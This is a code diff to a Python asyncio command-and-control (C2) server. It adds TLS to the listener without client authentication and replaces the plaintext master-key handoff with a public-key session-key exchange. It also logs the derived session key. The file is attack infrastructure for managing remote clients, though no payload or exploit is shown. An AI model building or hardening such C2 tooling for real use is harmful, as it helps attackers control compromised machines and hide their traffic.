@@ -22,6 +22,7 @@ from models.client_state import ClientState
 from models.message_type import MessageType
 from models.command_type import CommandType
 from models.encryption_manager import EncryptionManager
+from models.tls_helper import TLSSessionHelper
 
 # ==================== CONFIGURATION ====================
 
@@ -42,7 +43,7 @@ class C2Server:
         self.clients: Dict[str, ClientState] = {}
         self.shutdown = asyncio.Event()   # <-- shared shutdown signal
         self._server: asyncio.base_events.Server | None = None
-        self._encryption_manager = EncryptionManager(master_key)
+        self._encryption_manager = EncryptionManager()
     
     async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         """
@@ -57,11 +58,13 @@ class C2Server:
                 return
             client_id = msg.client_id
             client_state = ClientState(client_id, reader, writer)
+            self._encryption_manager.compute_session_key(msg.command)
+            logger.info(f"Shared key: {self._encryption_manager.session_key}")
             self.clients[client_id] = client_state
             logger.info(f"Client registered: {client_id}")
             # Send acknowledgment
-            master_key = base64.b64encode(self._encryption_manager.master_key).decode()
-            await send_message(writer, Message.as_ack(client_id, master_key).to_payload(True))
+            serialized_public_key = self._encryption_manager.serialized_public_key
+            await send_message(writer, Message.as_ack(client_id, serialized_public_key).to_payload(True))
             # Main client loop
             await self._client_loop(client_state)
         except asyncio.CancelledError:
@@ -178,10 +181,19 @@ class C2Server:
 
     async def start_server(self):
         """Start the C2 server"""
+        ssl_ctx = TLSSessionHelper().create_context(
+            is_server=True,
+            certfile=".auth/server.crt",
+            keyfile=".auth/server.key",
+            cafile=None, # no client authentication
+            require_client_cert=False
+        )
+
         self._server = await asyncio.start_server(
             self.handle_client,
             self.host,
-            self.port
+            self.port,
+            ssl=ssl_ctx
         )
         addr = self._server.sockets[0].getsockname()
         logger.info(f"C2 Server listening on {addr[0]}:{addr[1]}")
